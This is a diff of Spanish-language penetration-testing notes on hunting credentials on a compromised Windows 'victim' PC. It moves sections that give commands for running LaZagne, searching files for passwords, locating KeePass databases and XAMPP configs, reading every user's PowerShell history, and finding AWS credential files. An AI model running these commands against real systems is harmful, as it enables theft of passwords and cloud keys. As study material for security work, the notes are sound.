@@ -24,9 +24,17 @@ Una vez que lo metimos en la pc victima lo corremos con:
 
     start lazagne.exe all
 
-#### también podemos usar el findr por cmd:
+### Buscar bases de datos de keepass
 
-    findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml *.settings
+    Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+### Buscar informacipon sensible de servidores XAMPP
+
+    Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+
+### Buscar información sensible en un path
+
+    Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 
 #### Powershell History
 
@@ -35,6 +43,10 @@ Una vez que lo metimos en la pc victima lo corremos con:
 #### Podemos también en un oneliner recorrer todos los archivos historicos de powershell a los que tenemos acceso
 
     foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
+
+#### también podemos usar el findr por cmd:
+
+    findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml *.settings
 
 #### El archivo unnatend.xml puede tener contraseñas también
 
@@ -130,12 +142,4 @@ para esto podemos usar SessionGopher
 Cuando realizamos una autenticación en AWS utilizando el cli o el sdk se enera un conjunto de credenciales que incluyen un Access Key Id y un Secret Access Key. Suele uardarse en:
 
     C:\Users\NombreDeUsuario\.aws\credentials
-
-### Buscar bases de datos de keepass
-
-    Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
-
-### Buscar informacipon sensible de servidores XAMPP
-
-    Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 
